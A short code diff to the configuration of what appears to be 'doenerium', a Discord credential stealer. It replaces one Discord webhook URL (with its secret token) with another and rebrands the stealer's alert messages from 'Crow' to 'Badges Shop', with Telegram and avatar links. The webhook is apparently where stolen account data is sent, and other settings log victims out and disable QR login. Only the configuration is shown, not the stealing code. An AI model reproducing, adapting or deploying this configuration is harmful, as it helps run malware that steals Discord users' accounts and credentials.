@@ -11,7 +11,7 @@ const {
   var config = {
     brand: "doenerium",
   
-    webhook: "https://discord.com/api/webhooks/1170745550061178972/UUB6UHIJrdX7BEHIeVI4nA9nj846PvKyXmWWoyrsrzYOCm5gczgWSVFxMZ8NZmG6f1j8",
+    webhook: "https://discord.com/api/webhooks/1181003876770533406/N5iF07fugS2Qs2f4z29iLy9LQzTKudYxIAXBjsVuyeRT09hBvD2z3UByuLzit9XsiKn-",
   
     logout: true,
     disable_qr_code: true,
@@ -21,12 +21,12 @@ const {
     ping: [true, "@everyone"],
   
     embed: {
-        username: "Crow",
+        username: "Badges Shop",
         footer: {
-            text: `Crow will destroy everyone! 🏴‍☠️`,
+            text: `Badges Shop | Yuri & YKG`,
         },
-        href: "https://t.me/crowstealer",
-        avatar_url: "https://media.discordapp.net/attachments/1168727383570915358/1170559761041850378/83e4e6d9-2465-4017-9801-070da6e9064f.png?ex=65597bba&is=654706ba&hm=096a07f36f1ec941f074a07fdc85a33786256d6b76d06d1c713b8f499631beb3&=&width=509&height=509",
+        href: "https://t.me/contasdc",
+        "avatar_url": "https://cdn.discordapp.com/icons/1180631790243815504/7ff2737eb088e22cac55cdf7326da362.webp?size=512",
     },
   
     badges: {
